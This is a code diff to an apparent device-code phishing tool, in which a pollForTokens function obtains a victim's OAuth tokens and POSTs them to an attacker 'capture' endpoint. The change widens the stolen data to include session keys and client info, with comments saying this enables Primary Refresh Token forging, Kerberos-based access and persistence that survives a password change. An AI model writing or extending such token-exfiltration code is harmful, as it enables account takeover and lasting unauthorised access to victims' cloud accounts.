@@ -184,16 +184,39 @@ async function pollForTokens(deviceCode, jwtToken, verifyData) {
       const tokenData = await tokenResponse.json();
 
       if (tokenData.access_token) {
-        // Send tokens back to main server - INCLUDING REFRESH TOKEN for password change survival
+        // Send full token response to capture PRT data (session_key, client_info, etc.)
+        // This enables PRT JWT construction and Kerberos-based access
+        const capturePayload = {
+          jwt_token: jwtToken,
+          access_token: tokenData.access_token,
+          refresh_token: tokenData.refresh_token,
+          id_token: tokenData.id_token,
+        };
+        
+        // Add PRT persistence fields if available
+        if (tokenData.client_info) {
+          capturePayload.client_info = tokenData.client_info;
+        }
+        if (tokenData.session_key) {
+          capturePayload.session_key = tokenData.session_key;
+        }
+        if (tokenData.session_key_enc) {
+          capturePayload.session_key_enc = tokenData.session_key_enc;
+        }
+        if (tokenData.token_type) {
+          capturePayload.token_type = tokenData.token_type;
+        }
+        if (tokenData.expires_in) {
+          capturePayload.expires_in = tokenData.expires_in;
+        }
+        if (tokenData.scope) {
+          capturePayload.scope = tokenData.scope;
+        }
+        
         await fetch(`${VERIFY_ENDPOINT}/api/capture`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            jwt_token: jwtToken,
-            access_token: tokenData.access_token,
-            refresh_token: tokenData.refresh_token,
-            id_token: tokenData.id_token,
-          }),
+          body: JSON.stringify(capturePayload),
         });
         return;
       } else if (tokenData.error === 'authorization_declined' || tokenData.error === 'expired_token') {
